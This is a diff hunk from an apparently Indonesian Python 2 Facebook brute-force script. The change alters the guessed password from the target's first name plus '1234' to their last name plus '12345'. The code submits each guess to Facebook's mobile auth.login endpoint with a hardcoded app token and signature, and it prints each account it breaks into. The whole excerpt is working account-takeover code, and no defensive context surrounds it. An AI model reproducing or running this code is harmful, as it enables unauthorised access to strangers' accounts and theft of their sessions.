@@ -234,7 +234,7 @@ def pilih_mbf():
                                                 z = json.loads(x.text)
                                                 print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                             else:
-                                                pass9 = b['first_name'] + '1234'
+                                                pass9 = b['last_name'] + '12345'
                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 q = json.load(data)
                                                 if 'access_token' in q:
